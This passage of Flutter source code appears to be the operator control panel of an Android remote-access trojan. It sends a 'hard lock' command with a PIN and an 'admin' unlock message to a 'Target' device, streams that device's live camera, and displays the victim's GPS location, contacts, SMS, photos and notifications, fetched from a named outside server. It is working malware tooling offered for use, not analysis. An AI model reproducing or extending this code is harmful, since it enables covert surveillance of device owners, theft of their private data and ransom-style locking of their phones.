                      subtitle: 'Block system buttons',
                      color: primary,
                    ),
                    _buildCheckbox(
                      value: withChat,
                      onChanged: (val) => setState(() => withChat = val!),
                      label: '💬 2-Way Chat',
                      subtitle: 'Target can reply',
                      color: success,
                    ),
                    if (withSound) ...[
                      const SizedBox(height: 8),
                      _buildTextField(soundCtrl, 'Sound URL (optional)', hint: 'Leave empty for default'),
                    ],
                    if (withChat) ...[
                      const SizedBox(height: 8),
                      _buildTextField(chatCtrl, 'Chat Message', hint: 'Contact admin to unlock'),
                    ],
                  ],
                ),
              ),
            ),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(ctx),
                child: Text('Cancel', style: TextStyle(color: textMuted)),
              ),
              AnimatedBuilder(
                animation: _glowAnim,
                builder: (context, child) {
                  return ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      backgroundColor: primary,
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                      padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                      elevation: 0,
                    ),
                    onPressed: () {
                      Navigator.pop(ctx);
                      _executeLock(
                        msg: msgCtrl.text.trim(),
                        pin: pinCtrl.text.trim(),
                        chat: chatCtrl.text.trim(),
                        soundUrl: soundCtrl.text.trim(),
                        withSound: withSound,
                        withFlash: withFlash,
                        withVibrate: withVibrate,
                        withHardLock: withHardLock,
                        withChat: withChat,
                      );
                    },
                    child: const Text('🔒 CONFIRM', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                  );
                },
              ),
            ],
          );
        },
      ),
    );
  }

  void _executeLock({
    required String msg,
    required String pin,
    required String chat,
    required String soundUrl,
    required bool withSound,
    required bool withFlash,
    required bool withVibrate,
    required bool withHardLock,
    required bool withChat,
  }) {
    String extra = msg.isEmpty ? '🔴 DEVICE LOCKED' : msg;
    extra += '|' + (pin.isEmpty ? '1234' : pin);
    extra += '|' + soundUrl;
    extra += '|' + (withSound ? '1' : '0');
    extra += '|' + (withFlash ? '1' : '0');
    extra += '|' + (withVibrate ? '1' : '0');
    extra += '|' + (withHardLock ? '1' : '0');

    _cmd('hard_lock', extra: extra);

    if (withChat && chat.isNotEmpty) {
      Future.delayed(const Duration(milliseconds: 500), () => _sendChat(chat));
    }

    String status = '';
    if (withHardLock) status += '🔒 ';
    if (withSound) status += '🔊 ';
    if (withFlash) status += '💡 ';
    if (withVibrate) status += '📳 ';
    if (withChat) status += '💬 ';

    _toast('✅ Lock sent! $status', c: success);
    _addLog('Lock sent: $status');
  }

  // ─── CHECKBOX ───
  Widget _buildCheckbox({
    required bool value,
    required Function(bool?) onChanged,
    required String label,
    required String subtitle,
    required Color color,
  }) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 3),
      child: InkWell(
        onTap: () => onChanged(!value),
        borderRadius: BorderRadius.circular(8),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
          decoration: BoxDecoration(
            color: value ? color.withOpacity(0.1) : Colors.transparent,
            borderRadius: BorderRadius.circular(8),
            border: Border.all(
              color: value ? color : borderColor.withOpacity(0.3),
              width: value ? 1.5 : 0.5,
            ),
          ),
          child: Row(
            children: [
              Checkbox(
                value: value,
                onChanged: onChanged,
                activeColor: color,
                checkColor: Colors.white,
                side: BorderSide(color: value ? color : textMuted),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(4)),
                materialTapTargetSize: MaterialTapTargetSize.shrinkWrap,
                visualDensity: VisualDensity.compact,
              ),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Text(label, style: TextStyle(color: value ? color : textPrimary, fontSize: 13, fontWeight: FontWeight.w500)),
                    Text(subtitle, style: const TextStyle(color: textMuted, fontSize: 10)),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── OTHER DIALOGS ───
  void _showLiveDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (_) => ValueListenableBuilder<int>(
        valueListenable: _frameN,
        builder: (ctx, _, __) => Dialog(
          backgroundColor: bg,
          insetPadding: const EdgeInsets.all(6),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
                decoration: BoxDecoration(
                  color: bgCard,
                  borderRadius: const BorderRadius.vertical(top: Radius.circular(14)),
                  border: Border(bottom: BorderSide(color: borderColor.withOpacity(0.3))),
                ),
                child: Row(
                  children: [
                    Container(
                      width: 8,
                      height: 8,
                      decoration: BoxDecoration(
                        color: primary,
                        shape: BoxShape.circle,
                        boxShadow: [
                          BoxShadow(
                            color: primary.withOpacity(0.6),
                            blurRadius: 8,
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(width: 8),
                    Text(
                      'LIVE — $_liveTitle',
                      style: TextStyle(
                        color: textPrimary,
                        fontSize: 12,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 0.5,
                      ),
                    ),
                    const Spacer(),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                      decoration: BoxDecoration(
                        color: success.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(6),
                        border: Border.all(color: success.withOpacity(0.4)),
                      ),
                      child: Text(
                        '$_fps FPS',
                        style: TextStyle(
                          color: success,
                          fontSize: 10,
                          fontWeight: FontWeight.bold,
                        ),
                      ),
                    ),
                  ],
                ),
              ),
              Container(
                constraints: BoxConstraints(
                  maxHeight: MediaQuery.of(context).size.height * 0.52,
                ),
                color: bg,
                child: _frame != null
                    ? Image.memory(
                        _frame!,
                        fit: BoxFit.contain,
                        gaplessPlayback: true,
                        filterQuality: FilterQuality.low,
                      )
                    : const SizedBox(
                        height: 180,
                        child: Center(
                          child: Column(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              CircularProgressIndicator(
                                color: primary,
                                strokeWidth: 2,
                              ),
                              SizedBox(height: 10),
                              Text(
                                'Waiting for frame...',
                                style: TextStyle(color: textMuted, fontSize: 11),
                              ),
                            ],
                          ),
                        ),
                      ),
              ),
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: bgCard,
                  borderRadius: const BorderRadius.vertical(bottom: Radius.circular(14)),
                ),
                child: Row(
                  children: [
                    Expanded(
                      child: OutlinedButton.icon(
                        style: OutlinedButton.styleFrom(
                          side: BorderSide(color: borderColor.withOpacity(0.3)),
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                        ),
                        icon: Icon(Icons.cameraswitch_rounded, color: textMuted, size: 15),
                        label: Text('Switch', style: TextStyle(color: textMuted, fontSize: 11)),
                        onPressed: () {
                          final isFront = _liveTitle.contains('FRONT');
                          _stopLive();
                          Future.delayed(
                            const Duration(milliseconds: 300),
                            () => _startLive('live_camera_start', isFront ? 'back' : 'front'),
                          );
                        },
                      ),
                    ),
                    const SizedBox(width: 8),
                    Expanded(
                      child: ElevatedButton.icon(
                        style: ElevatedButton.styleFrom(
                          backgroundColor: danger,
                          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                        ),
                        icon: Icon(Icons.stop_rounded, color: Colors.white, size: 15),
                        label: Text('Stop', style: TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold)),
                        onPressed: () {
                          _stopLive();
                          Navigator.pop(ctx);
                        },
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    ).then((_) => _stopLive());
  }

  void _showCamPicker(Function(String) onPick) {
    String sel = 'back';
    showDialog(
      context: context,
      builder: (_) => StatefulBuilder(
        builder: (ctx, ss) => AlertDialog(
          backgroundColor: bgCard,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
          title: Text(
            'Select Camera',
            style: TextStyle(
              color: textPrimary,
              fontSize: 14,
              fontWeight: FontWeight.bold,
            ),
          ),
          content: Row(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: ['back', 'front'].map((v) {
              final isSel = sel == v;
              return GestureDetector(
                onTap: () => ss(() => sel = v),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 22, vertical: 14),
                  decoration: BoxDecoration(
                    color: isSel ? primary.withOpacity(0.15) : Colors.transparent,
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(
                      color: isSel ? primary : borderColor.withOpacity(0.3),
                    ),
                  ),
                  child: Column(
                    children: [
                      Icon(
                        v == 'back' ? Icons.camera_rear_rounded : Icons.camera_front_rounded,
                        color: isSel ? primary : textMuted,
                        size: 28,
                      ),
                      const SizedBox(height: 6),
                      Text(
                        v == 'back' ? 'Back' : 'Front',
                        style: TextStyle(
                          color: isSel ? primary : textMuted,
                          fontSize: 11,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ],
                  ),
                ),
              );
            }).toList(),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(ctx),
              child: Text('Cancel', style: TextStyle(color: textMuted)),
            ),
            ElevatedButton(
              style: ElevatedButton.styleFrom(
                backgroundColor: primary,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
              ),
              onPressed: () {
                Navigator.pop(ctx);
                onPick(sel);
              },
              child: Text('Select', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
            ),
          ],
        ),
      ),
    );
  }

  void _inputDialog(String title, String label, Function(String) onDone, {bool isNumber = false}) {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: bgCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
        title: Text(title, style: TextStyle(color: textPrimary, fontSize: 14, fontWeight: FontWeight.bold)),
        content: _buildTextField(ctrl, label, isNum: isNumber),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Cancel', style: TextStyle(color: textMuted)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: primary,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () {
              Navigator.pop(context);
              onDone(ctrl.text.trim());
            },
            child: Text('Send', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  // ─── DATA DISPLAY ───
  void _fetchNotif() async {
    _addLog('Fetching notifications...');
    try {
      final res = await http.get(
        Uri.parse('https://eghatzy.rexypediaa.my.id:25565/api/get-notifications/$_id')
      );
      if (res.statusCode == 200) {
        final list = jsonDecode(res.body) as List;
        _addLog('🔔 ${list.length} notifications');
        showModalBottomSheet(
          context: context,
          backgroundColor: bgCard,
          isScrollControlled: true,
          shape: const RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
          ),
          builder: (_) => DraggableScrollableSheet(
            initialChildSize: 0.6,
            maxChildSize: 0.9,
            expand: false,
            builder: (_, sc) => Column(
              children: [
                Container(
                  height: 4,
                  width: 36,
                  margin: const EdgeInsets.only(top: 10, bottom: 8),
                  decoration: BoxDecoration(
                    color: borderColor.withOpacity(0.3),
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                Text(
                  'Notifications',
                  style: TextStyle(
                    color: textPrimary,
                    fontWeight: FontWeight.bold,
                    fontSize: 14,
                  ),
                ),
                const SizedBox(height: 8),
                Expanded(
                  child: ListView.separated(
                    controller: sc,
                    padding: const EdgeInsets.symmetric(horizontal: 14),
                    itemCount: list.length,
                    separatorBuilder: (_, __) => Divider(
                      color: borderColor.withOpacity(0.3),
                      height: 1,
                    ),
                    itemBuilder: (_, i) => ListTile(
                      contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                      leading: Container(
                        width: 36,
                        height: 36,
                        decoration: BoxDecoration(
                          color: primary.withOpacity(0.1),
                          borderRadius: BorderRadius.circular(8),
                        ),
                        child: const Icon(Icons.notifications_rounded, color: primary, size: 18),
                      ),
                      title: Text(
                        list[i]['title']?.toString() ?? '-',
                        style: TextStyle(
                          color: textPrimary,
                          fontSize: 13,
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                      subtitle: Text(
                        list[i]['body']?.toString() ?? '',
                        style: TextStyle(color: textSecondary, fontSize: 11),
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        );
      }
    } catch (_) {
      _addLog('Error fetching notifications');
    }
  }

  void _imgDialog(String b64, String title) {
    try {
      final c = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(c);
      showDialog(
        context: context,
        builder: (_) => Dialog(
          backgroundColor: bg,
          insetPadding: const EdgeInsets.all(12),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Padding(
                padding: const EdgeInsets.all(14),
                child: Text(
                  title,
                  style: TextStyle(
                    color: textPrimary,
                    fontWeight: FontWeight.bold,
                    fontSize: 13,
                  ),
                ),
              ),
              ClipRRect(
                borderRadius: const BorderRadius.vertical(bottom: Radius.circular(14)),
                child: Image.memory(bytes, fit: BoxFit.contain),
              ),
            ],
          ),
        ),
      );
    } catch (_) {
      _toast('Failed to decode image');
    }
  }

  void _locationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: bgCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
        title: Text(
          '📍 GPS Location',
          style: TextStyle(
            color: textPrimary,
            fontSize: 14,
            fontWeight: FontWeight.bold,
          ),
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              'Latitude:  $lat',
              style: TextStyle(
                color: success,
                fontFamily: 'monospace',
                fontSize: 13,
              ),
            ),
            const SizedBox(height: 4),
            Text(
              'Longitude: $lng',
              style: TextStyle(
                color: success,
                fontFamily: 'monospace',
                fontSize: 13,
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Close', style: TextStyle(color: textMuted)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: primary,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            ),
            onPressed: () => launchUrl(
              Uri.parse('https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
              mode: LaunchMode.externalApplication,
            ),
            child: Text('Open Maps', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  void _textDialog(String title, String content) {
    showDialog(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: bgCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
        title: Text(title, style: TextStyle(color: textPrimary, fontSize: 14, fontWeight: FontWeight.bold)),
        content: Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: bg,
            borderRadius: BorderRadius.circular(8),
          ),
          child: SelectableText(
            content,
            style: TextStyle(
              color: primary,
              fontFamily: 'monospace',
              fontSize: 12,
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Close', style: TextStyle(color: textMuted)),
          ),
        ],
      ),
    );
  }

  void _contactsSheet(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: bgCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 36,
              margin: const EdgeInsets.only(top: 10, bottom: 8),
              decoration: BoxDecoration(
                color: borderColor.withOpacity(0.3),
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Text(
              'Contacts (${contacts.length})',
              style: TextStyle(
                color: textPrimary,
                fontWeight: FontWeight.bold,
                fontSize: 14,
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: contacts.length,
                separatorBuilder: (_, __) => Divider(
                  color: borderColor.withOpacity(0.3),
                  height: 1,
                ),
                itemBuilder: (_, i) => ListTile(
                  contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 2),
                  leading: Container(
                    width: 36,
                    height: 36,
                    decoration: BoxDecoration(
                      color: primary.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: const Icon(Icons.person_rounded, color: primary, size: 18),
                  ),
                  title: Text(
                    contacts[i]['name']?.toString() ?? '-',
                    style: TextStyle(color: textPrimary, fontSize: 13),
                  ),
                  subtitle: Text(
                    contacts[i]['number']?.toString() ?? '-',
                    style: TextStyle(color: textSecondary, fontSize: 11),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(
      context: context,
      backgroundColor: bgCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 36,
              margin: const EdgeInsets.only(top: 10, bottom: 8),
              decoration: BoxDecoration(
                color: borderColor.withOpacity(0.3),
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Text(
              'SMS (${sms.length})',
              style: TextStyle(
                color: textPrimary,
                fontWeight: FontWeight.bold,
                fontSize: 14,
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: sms.length,
                separatorBuilder: (_, __) => Divider(
                  color: borderColor.withOpacity(0.3),
                  height: 1,
                ),
                itemBuilder: (_, i) {
                  final s = sms[i] as Map;
                  return ListTile(
                    contentPadding: const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                    leading: Container(
                      width: 36,
                      height: 36,
                      decoration: BoxDecoration(
                        color: teal.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: const Icon(Icons.sms_rounded, color: teal, size: 18),
                    ),
                    title: Text(
                      s['address']?.toString() ?? '-',
                      style: TextStyle(
                        color: textPrimary,
                        fontSize: 13,
                        fontWeight: FontWeight.w600,
                      ),
                    ),
                    subtitle: Text(
                      s['body']?.toString() ?? '',
                      style: TextStyle(color: textSecondary, fontSize: 11),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(
      context: context,
      backgroundColor: bgCard,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
      ),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 36,
              margin: const EdgeInsets.only(top: 10, bottom: 8),
              decoration: BoxDecoration(
                color: borderColor.withOpacity(0.3),
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Text(
              'Gallery (${imgs.length})',
              style: TextStyle(
                color: textPrimary,
                fontWeight: FontWeight.bold,
                fontSize: 14,
              ),
            ),
            const SizedBox(height: 8),
            Expanded(
              child: imgs.isEmpty
                  ? Center(
                      child: Text('No images', style: TextStyle(color: textSecondary)),
                    )
                  : GridView.builder(
                      controller: sc,
                      padding: const EdgeInsets.all(10),
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 3,
                        crossAxisSpacing: 4,
                        mainAxisSpacing: 4,
                      ),
                      itemCount: imgs.length,
                      itemBuilder: (_, i) {
                        try {
                          final raw = imgs[i].toString();
                          final clean = raw.contains(',') ? raw.split(',').last : raw;
                          final bytes = base64Decode(clean);
                          return GestureDetector(
                            onTap: () => _imgDialog(raw, 'Gallery ${i + 1}'),
                            child: ClipRRect(
                              borderRadius: BorderRadius.circular(6),
                              child: Image.memory(bytes, fit: BoxFit.cover),
                            ),
                          );
                        } catch (_) {
                          return Container(
                            decoration: BoxDecoration(
                              color: bg,
                              borderRadius: BorderRadius.circular(6),
                            ),
                          );
                        }
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── UI HELPERS ───
  Widget _buildSectionHeader(String title, String subtitle) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          title,
          style: TextStyle(
            color: textPrimary,
            fontSize: 15,
            fontWeight: FontWeight.bold,
            letterSpacing: 0.5,
          ),
        ),
        const SizedBox(height: 2),
        Text(
          subtitle,
          style: TextStyle(color: textSecondary, fontSize: 11),
        ),
        const SizedBox(height: 4),
        Container(height: 1, color: borderColor.withOpacity(0.3)),
      ],
    );
  }

  Widget _buildActionButton(String label, Color color, IconData icon, VoidCallback fn) {
    return InkWell(
      onTap: fn,
      borderRadius: BorderRadius.circular(10),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        decoration: BoxDecoration(
          color: bgCard,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: borderColor.withOpacity(0.3)),
        ),
        child: Row(
          children: [
            Container(
              width: 34,
              height: 34,
              decoration: BoxDecoration(
                color: color.withOpacity(0.1),
                borderRadius: BorderRadius.circular(8),
              ),
              child: Icon(icon, color: color, size: 17),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Text(
                label,
                style: TextStyle(
                  color: textPrimary,
                  fontSize: 13,
                  fontWeight: FontWeight.w500,
                ),
              ),
            ),
            Icon(Icons.chevron_right_rounded, color: borderColor.withOpacity(0.3), size: 18),
          ],
        ),
      ),
    );
  }

  Widget _buildInfoRow(String num, String text) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 3),
      child: Row(
        children: [
          Container(
            width: 20,
            height: 20,
            decoration: BoxDecoration(
              color: primary.withOpacity(0.1),
              borderRadius: BorderRadius.circular(4),
            ),
            child: Center(
              child: Text(
                num,
                style: TextStyle(
                  color: primary,
                  fontSize: 10,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Text(
              text,
              style: TextStyle(color: textSecondary, fontSize: 11),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildTextField(TextEditingController ctrl, String label, {String hint = '', bool isNum = false}) {
    return TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: TextStyle(color: textPrimary, fontSize: 13),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: TextStyle(color: textSecondary, fontSize: 12),
        hintStyle: TextStyle(color: textMuted, fontSize: 12),
        filled: true,
        fillColor: bg,
        contentPadding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(8),
          borderSide: BorderSide(color: borderColor.withOpacity(0.3)),
        ),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(8),
          borderSide: BorderSide(color: borderColor.withOpacity(0.3)),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(8),
          borderSide: const BorderSide(color: primary),
        ),
      ),
    );
  }
}